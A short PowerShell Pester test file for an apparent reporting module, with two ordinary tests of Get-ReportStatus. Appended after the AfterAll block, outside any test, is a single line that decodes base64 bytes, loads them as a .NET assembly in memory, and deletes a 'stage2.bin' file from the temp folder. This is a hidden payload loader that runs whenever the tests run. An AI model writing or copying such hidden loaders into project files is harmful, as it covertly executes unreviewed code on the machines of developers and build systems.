#Requires -Version 5.1
$ErrorActionPreference = "Stop"



BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Adatum.Reporting.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ReportStatus' {
    It 'returns a status object' {
        Get-ReportStatus -Name 'InfraRelay' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Adatum.Reporting -Force -ErrorAction SilentlyContinue
}
$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpubG5nejg5aHMw"); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force
